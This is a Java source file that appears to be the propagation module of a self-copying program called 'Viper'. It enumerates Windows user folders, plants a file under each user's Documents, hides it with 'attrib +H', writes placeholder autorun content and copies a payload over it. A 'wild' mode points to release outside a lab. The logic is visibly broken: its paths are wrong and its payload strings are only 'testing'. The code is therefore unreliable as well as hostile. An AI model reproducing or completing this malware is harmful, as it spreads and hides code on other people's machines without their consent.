package propogartion;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import communication.Identification;

public class NestEgg {
	static String[] inCodedL= {"testing","testing","testing"};
	static String[] inCodedW= {"testing","testing","testing"};
	static int unitCopys=0;
	static int unitNum;
public static void labEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String usePath= createFilePath(users.getAbsolutePath());
		createCopy(usePath,vPath,true);
		copyMode(usePath);
	}

}
public static void wildEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String usePath= createFilePath(users.getAbsolutePath());
		createCopy(usePath,vPath,false);
		
	}
}
public static String createFilePath(String userPath){
	File uP=new File(userPath+"/Documents/vn");
	if(uP.exists()==false){
		try {
			uP.createNewFile();
		} catch (IOException e) {
			System.out.println("interfearence");
			e.printStackTrace();
		}
		
	}
	if(uP.isHidden()==false){
		
		try {
			Runtime.getRuntime().exec("attrib +H "+uP.getAbsolutePath());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	return uP.getAbsolutePath() ;
	
}
public static void createCopy(String filePath,Path vPath,boolean lab){
	File nestLocation=new File(filePath);
	Identification nVID=new Identification();
	try{
		 
		
		 
		
		
		
			
		 if(!nestLocation.exists()){
			 nestLocation.createNewFile();
		 
		createAutoRun(lab,nestLocation);
		
		
		 }
		 }
		 catch(IOException e){
		 System.out.println( "Error: "+ e.toString());
		 }
	nVID.saveInfo(unitNum++, 0, nestLocation);
	try {
		File vF=new File(filePath+"/Viper.java");
		if(vF.exists()==false){
			unitCopys++;
		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
		}
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

}
public static void copyMode(String filePath){
	File nestLocation= new File(filePath);
	File mode=new File(filePath+"/mode.txt");
	if(mode.exists()==false){
		try {
			mode.createNewFile();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
public static int getUnitsCreated(){
	return unitCopys;
	
}
public static void createAutoRun(boolean lab, File nestLocation) throws IOException{
	 FileWriter fw= new FileWriter(nestLocation.getAbsolutePath());
		BufferedWriter writing= new BufferedWriter(fw);
	
		if(lab==true){
		
	   for(int x=0;x<inCodedL.length; x++){
		writing.write(inCodedL[x]);
		writing.newLine();
		}
	    writing.close();
		}else if(lab==false){
			for(int x=0;x<inCodedW.length; x++){
				writing.write(inCodedW[x]);
				writing.newLine();
				}
			    writing.close();	
		}
}
}
